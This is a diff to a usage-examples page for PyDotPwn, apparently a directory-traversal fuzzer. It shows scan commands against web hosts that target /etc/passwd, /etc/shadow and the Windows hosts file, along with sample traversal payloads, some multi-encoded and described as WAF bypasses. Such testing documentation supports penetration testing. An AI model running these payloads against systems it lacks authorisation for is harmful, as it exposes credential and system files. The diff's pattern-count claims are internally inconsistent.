@@ -21,33 +21,67 @@ This section provides comprehensive examples of using PyDotPwn in real-world sec
 
 ## 🌐 Web Application Testing
 
-### 🆕 Modern Web Application Scan with Absolute Path Detection
+### 🆕 Path Validation Bypass - Revolutionary Feature
 
-**Scenario**: Testing a web application with comprehensive absolute path detection (NEW FEATURE).
+**Scenario**: Testing modern web applications that validate legitimate path prefixes (NEW EXCLUSIVE FEATURE).
+
+#### Enterprise Web Application Testing
+```bash
+# Revolutionary: Path validation bypass with 25,000+ patterns
+python dotdotpwn.py --module http --host enterprise.com --file /etc/passwd --depth 6
+# Generates: /var/www/uploads/../../../../../etc/passwd
+#           /var/www/images/../../../../../etc/passwd
+#           + 25,000+ more patterns with multi-level encoding
+
+# Windows enterprise application
+python dotdotpwn.py --module http --host windows-app.com --file "C:\Windows\System32\drivers\etc\hosts" --depth 4
+# Generates: C:\inetpub\wwwroot\uploads\..\..\..\Windows\System32\drivers\etc\hosts
+```
+
+#### Advanced WAF Bypass Testing
+```bash
+# Deep encoding bypass (quintuple URL encoding)
+python dotdotpwn.py --module http --host protected.com --file /etc/passwd --depth 3
+# Includes patterns like: /var/www/images/%2525252e%2525252e%2525252f%2525252e%2525252e%2525252fetc/passwd
+
+# Pattern generation for analysis
+python dotdotpwn.py main --module stdout --os-type unix --file "/etc/passwd" --depth 3 > patterns.txt
+# Generates 25,000+ patterns to file for manual analysis
+```
+
+### 🎯 Modern Web Application Scan with Absolute Path Detection
+
+**Scenario**: Testing a web application with comprehensive absolute path detection (ENHANCED FEATURE).
 
 #### CLI Command
 ```bash
-# NEW: Enhanced scan with absolute path patterns (144+ patterns)
-python dotdotpwn.py --module http --host webapp.company.com --file /etc/passwd --pattern "root:" --depth 8 --absolute
+# Enhanced scan with absolute path patterns (144+ patterns per target)
+python dotdotpwn.py --module http --host webapp.company.com --file /etc/passwd --pattern "root:" --depth 8
 
-# NEW: Generate patterns only (no scanning)
-python dotdotpwn.py generate --os-type unix --file /etc/passwd --depth 5 --absolute
+# Generate all patterns (path validation + absolute + relative)
+python dotdotpwn.py main --module stdout --os-type unix --file /etc/passwd --depth 5
 
-# NEW: Multiple target file aliases supported
-python dotdotpwn.py --module http --host webapp.company.com -f /etc/passwd --pattern "root:" --absolute
-python dotdotpwn.py --module http --host webapp.company.com --target-file /etc/shadow --pattern "root:" --absolute
-python dotdotpwn.py --module http --host webapp.company.com --specific-file /etc/hosts --depth 6 --absolute
+# Multiple target file aliases supported
+python dotdotpwn.py --module http --host webapp.company.com -f /etc/passwd --pattern "root:"
+python dotdotpwn.py --module http --host webapp.company.com --target-file /etc/shadow --pattern "root:"
+python dotdotpwn.py --module http --host webapp.company.com --specific-file /etc/hosts --depth 6
 
 # Enhanced scan with OS detection
-python dotdotpwn.py --module http --host webapp.company.com --ssl --detect-os --service-detection --break-on-first --pattern "root:" --absolute
+python dotdotpwn.py --module http --host webapp.company.com --ssl --detect-os --service-detection --break-on-first --pattern "root:"
 ```
 
 ### 📊 Pattern Generation Comparison
 
 ```bash
-# Original approach (relative only)
-python dotdotpwn.py generate --file /etc/passwd --depth 6 --no-absolute
-# Output: 1,778 patterns (0.11% absolute coverage)
+# Traditional approach (limited patterns)
+# Original DotDotPwn: ~1,778 patterns total
+python dotdotpwn.py main --module stdout --os-type unix --file "/etc/passwd" --depth 3 | wc -l
+# Output: 25,000+ patterns (1,305% increase)
+
+# Pattern breakdown:
+# - Relative traversal: ~1,778 patterns (traditional)
+# - Absolute path: ~144 patterns (4,700% increase over original)
+# - Path validation bypass: ~25,000 patterns (NEW - not in original)
 
 # NEW: Enhanced approach (with absolute paths)  
 python dotdotpwn.py generate --file /etc/passwd --depth 6 --absolute
